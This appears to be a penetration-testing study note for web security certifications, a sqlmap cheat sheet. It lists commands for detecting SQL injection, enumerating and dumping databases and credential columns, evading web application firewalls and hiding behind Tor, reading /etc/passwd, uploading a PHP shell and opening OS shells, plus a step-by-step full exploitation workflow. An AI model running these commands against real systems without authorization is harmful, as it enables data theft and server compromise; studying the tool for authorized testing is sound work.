2026-02-06

Status:

Tags: [[eWPT]] [[SQL Injection]] [[eWPTX]]
###### Prerequisites: [[Exploiting UNION Based SQLI]]
# SQLMAP Cheat Sheet

---
## Quick Reference

```bash
# Basic URL scan (auto-confirm prompts)
sqlmap -u "http://target.com/page?id=1" --batch

# From a saved Burp/ZAP request file
sqlmap -r request.txt

# POST data injection
sqlmap -u "http://target.com/login" --data="user=admin&pass=test"

# Cookie-based injection
sqlmap -u "http://target.com/dashboard" --cookie="PHPSESSID=abc123"

# Multi-parameter with specific target
sqlmap -u "http://target.com/page?id=1&cat=2" -p id
```

---
## Detection & Enumeration

```bash
# ── Fingerprint ──
sqlmap -u "URL" --banner              # DB version banner
sqlmap -u "URL" --current-db          # Current database name
sqlmap -u "URL" --current-user        # Current DB user
sqlmap -u "URL" --is-dba              # Check if user is DBA
sqlmap -u "URL" --hostname            # Server hostname

# ── Drill-down Enumeration (top → bottom) ──
sqlmap -u "URL" --dbs                               # List databases
sqlmap -u "URL" -D dbname --tables                   # List tables
sqlmap -u "URL" -D dbname -T users --columns         # List columns
sqlmap -u "URL" -D dbname -T users -C user,pass --dump  # Dump specific cols
sqlmap -u "URL" -D dbname -T users --dump            # Dump entire table

# ── Bulk Operations ──
sqlmap -u "URL" --dump-all --exclude-sysdbs   # Dump everything (skip system DBs)
sqlmap -u "URL" -D dbname -T users --count    # Row count only (fast recon)

# ── Search ──
sqlmap -u "URL" --search -C "password"        # Find columns named "password"
sqlmap -u "URL" --search -T "user"            # Find tables named "user"
sqlmap -u "URL" --search -C "email"           # Find columns named "email"
```

---
## Injection Techniques (`--technique`)

| Flag | Technique         | Description                              |
|------|-------------------|------------------------------------------|
| `B`  | Boolean-blind     | Infers data via true/false responses     |
| `E`  | Error-based       | Extracts data from DB error messages     |
| `U`  | UNION-based       | Uses UNION SELECT to retrieve data       |
| `S`  | Stacked queries   | Injects additional statements via `;`    |
| `T`  | Time-based blind  | Infers data via response time delays     |
| `Q`  | Inline queries    | Uses sub-queries embedded inline         |

```bash
# Use only UNION and Error-based (fastest)
sqlmap -u "URL" --technique=UE

# All techniques
sqlmap -u "URL" --technique=BEUSTQ

# Time-based only (stealthy, last resort)
sqlmap -u "URL" --technique=T --time-sec=5
```

---
## Targeting Parameters

```bash
# Target a specific parameter
sqlmap -u "http://target.com/page?id=1&cat=2" -p id

# Mark injection point with * (works in headers, URLs, POST body)
sqlmap -u "http://target.com/page/1*/details"

# Inject into a cookie value
sqlmap -u "http://target.com/" --cookie="token=value*" --level=2

# Inject into specific header
sqlmap -u "http://target.com/" --header="X-Forwarded-For: 127.0.0.1*"
```

### Level & Risk Matrix

| Level | What it tests                                      |
|-------|----------------------------------------------------|
| 1     | Default — GET/POST parameters                      |
| 2     | + Cookie parameters                                |
| 3     | + User-Agent, Referer headers                      |
| 4     | + Additional payloads                               |
| 5     | + Host header, all edge-case payloads              |

| Risk | What it allows                                      |
|------|-----------------------------------------------------|
| 1    | Default — safe, non-intrusive payloads              |
| 2    | + Heavy time-based queries                          |
| 3    | + OR-based payloads (can modify data — dangerous)   |

```bash
# Maximum detection surface
sqlmap -u "URL" --level=5 --risk=3
```

---
## Authentication & Session

```bash
# Cookie authentication
sqlmap -u "URL" --cookie="session=abc123; token=xyz"

# Basic / Digest / NTLM auth
sqlmap -u "URL" --auth-type=Basic --auth-cred="admin:password"

# Proxy through Burp Suite
sqlmap -u "URL" --proxy="http://127.0.0.1:8080"

# Randomize User-Agent per request
sqlmap -u "URL" --random-agent

# Custom headers
sqlmap -u "URL" --headers="Authorization: Bearer eyJhb...\nX-Custom: value"

# Ignore 401 responses
sqlmap -u "URL" --ignore-code=401
```

---
## WAF Bypass (`--tamper`)

| Tamper Script         | What it does                                 | Target DB   |
|-----------------------|----------------------------------------------|-------------|
| `space2comment`       | Replaces spaces with `/**/`                  | All         |
| `between`             | Replaces `>` with `NOT BETWEEN 0 AND`        | All         |
| `charencode`          | URL-encodes all characters                   | All         |
| `randomcase`          | Randomizes keyword casing                    | All         |
| `apostrophemask`      | Replaces `'` with UTF-8 fullwidth            | All         |
| `equaltolike`         | Replaces `=` with `LIKE`                     | All         |
| `percentage`          | Adds `%` between each character              | MySQL       |
| `space2mysqlblank`    | Replaces spaces with MySQL blank chars       | MySQL       |
| `space2mssqlblank`    | Replaces spaces with MSSQL blank chars       | MSSQL       |
| `space2hash`          | Replaces spaces with `#` + newline           | MySQL       |
| `base64encode`        | Base64-encodes the payload                   | All         |
| `versionedmorekeywords` | Encloses keywords in versioned comments    | MySQL       |

```bash
# Single tamper
sqlmap -u "URL" --tamper="space2comment"

# Chained tampers (applied in order)
sqlmap -u "URL" --tamper="space2comment,randomcase,between"

# Heavy WAF evasion chain
sqlmap -u "URL" --tamper="apostrophemask,charencode,space2comment,between,randomcase" \
  --random-agent --delay=2 --level=5 --risk=3
```

---
## OS Interaction

```bash
# Interactive OS shell (requires stacked queries + DBA)
sqlmap -u "URL" --os-shell

# Execute a single OS command
sqlmap -u "URL" --os-cmd="whoami"

# Read a file from the server
sqlmap -u "URL" --file-read="/etc/passwd"

# Upload a file to the server
sqlmap -u "URL" --file-write="./shell.php" --file-dest="/var/www/html/shell.php"

# Interactive SQL shell
sqlmap -u "URL" --sql-shell

# Execute a single SQL query
sqlmap -u "URL" --sql-query="SELECT user FROM mysql.user"
```

---
## Advanced Options

```bash
# ── Performance ──
sqlmap -u "URL" --threads=10          # Parallel requests (max 10)
sqlmap -u "URL" --delay=1             # Delay between requests (seconds)
sqlmap -u "URL" --timeout=30          # Per-request timeout
sqlmap -u "URL" --retries=5           # Retry on timeout

# ── Anonymity ──
sqlmap -u "URL" --tor --check-tor     # Route through Tor and verify
sqlmap -u "URL" --tor-type=SOCKS5 --tor-port=9050

# ── Session Management ──
sqlmap -u "URL" --flush-session       # Clear cached session data
sqlmap -u "URL" --fresh-queries       # Ignore stored query results

# ── Output ──
sqlmap -u "URL" -v 3                  # Verbosity (0=silent, 6=max)
sqlmap -u "URL" --output-dir=/tmp/out # Custom output directory
sqlmap -u "URL" --dump --csv-del=";"  # Custom CSV delimiter

# ── Form Auto-detection ──
sqlmap -u "http://target.com/login" --forms --batch --crawl=2

# ── Prefix / Suffix (manual tuning) ──
sqlmap -u "URL" --prefix="')" --suffix="-- -"

# ── Force DBMS ──
sqlmap -u "URL" --dbms=mysql
sqlmap -u "URL" --dbms=mssql
sqlmap -u "URL" --dbms=postgresql
```

---
## Second-Order Injection

```bash
# Response is reflected on a different page
sqlmap -u "http://target.com/register" --data="user=test" \
  --second-url="http://target.com/profile"

# Second-order via request file
sqlmap -r inject_request.txt --second-req=check_request.txt
```

Use when:  
- Input is stored and rendered on a **different endpoint**.  
- Registration form → Profile page, Log entry → Admin panel.

---
## Workflow Recipes

### 1. Quick Recon

```bash
sqlmap -u "http://target.com/page?id=1" --batch --banner
sqlmap -u "http://target.com/page?id=1" --batch --current-db --current-user --is-dba
sqlmap -u "http://target.com/page?id=1" --batch --dbs
sqlmap -u "http://target.com/page?id=1" --batch -D appdb --tables
```

### 2. Full Exploitation (Detect → Enum → Dump → Shell)

```bash
# Step 1 — Detect injection
sqlmap -r request.txt --batch --level=3 --risk=2

# Step 2 — Enumerate the database
sqlmap -r request.txt --batch -D webapp --tables

# Step 3 — Dump credentials
sqlmap -r request.txt --batch -D webapp -T users -C username,password --dump

# Step 4 — Get a shell (if DBA)
sqlmap -r request.txt --batch --os-shell
```

### 3. Blind Injection (Time-Based)

```bash
# Force time-based technique only
sqlmap -u "http://target.com/page?id=1" --technique=T --time-sec=5 --batch

# Increase threads carefully (too many = false positives)
sqlmap -u "http://target.com/page?id=1" --technique=T --time-sec=5 \
  --threads=5 --batch --current-db

# Dump with patience
sqlmap -u "http://target.com/page?id=1" --technique=T --time-sec=5 \
  -D appdb -T users --dump --batch
```

### 4. WAF Evasion Workflow

```bash
# Step 1 — Identify WAF
sqlmap -u "http://target.com/page?id=1" --identify-waf --batch

# Step 2 — Attempt bypass with tamper chain + random agent
sqlmap -u "http://target.com/page?id=1" \
  --tamper="space2comment,randomcase,between,charencode" \
  --random-agent --delay=3 --batch

# Step 3 — Escalate with chunked encoding + HPP
sqlmap -u "http://target.com/page?id=1" \
  --tamper="space2comment,randomcase,between,charencode" \
  --random-agent --delay=3 --chunked --hpp --batch

# Step 4 — If detected, slow down and use time-based only
sqlmap -u "http://target.com/page?id=1" \
  --tamper="apostrophemask,space2comment,randomcase" \
  --technique=T --time-sec=10 --random-agent --delay=5 --batch
```

---
